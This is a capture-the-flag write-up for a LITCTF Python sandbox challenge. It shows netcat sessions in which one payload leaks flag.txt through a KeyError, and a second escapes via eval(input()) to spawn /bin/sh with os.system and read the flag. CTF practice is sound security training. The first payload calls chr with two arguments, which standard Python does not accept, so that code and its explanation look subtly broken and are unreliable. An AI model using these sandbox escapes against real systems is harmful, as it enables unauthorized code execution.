```
zenniskayy@ZennisKayy:~$ nc litctf.org 31788 <<< '_=chr;__="a";___=(_(__,5)+_(__,11)+__+_(__,6)+"."+_(__,19)+_(__,23)+_(__,19));{}[(*open(___),)]'
>>> Traceback (most recent call last):
  File "/home/user/main.py", line 24, in <module>
    exec(cod.encode().decode("unicode_escape"))
  File "<string>", line 1, in <module>
KeyError: ('LITCTF{th3r3_4r3_s0_m4ny_r4nd0m_byp4s5es!}\n',)
zenniskayy@ZennisKayy:~$
```

>Flag: `LITCTF{th3r3_4r3_s0_m4ny_r4nd0m_byp4s5es!}`

The short explanation:

* `_=chr` uses the letters **c,h,r** exactly once.
* `__="a"` uses the letter **a** exactly once.
* The string `"flag.txt"` is built with `_(__, index)` (indices: f=5, l=11, a=0, g=6, “.”, t=19, x=23, t=19) — so you don’t type any letters directly.
* `{}[(*open(___),)]` opens the file, unpacks its contents into a tuple, then tries to use it as a dict key in an empty dict. That raises a `KeyError`, and Python prints the tuple (which contains the flag).

**Another solution**
```bash
(venv) zenniskayy@ZennisKayy:~/CTF/l1tx00n3wsAAAAAAAppn$ nc litctf.org 31788
>>> eval(input())
__import__("os").system("/bin/sh")
ls
flag.txt
main.py
run.sh
cat flag.txt
LITCTF{th3r3_4r3_s0_m4ny_r4nd0m_byp4s5es!}
```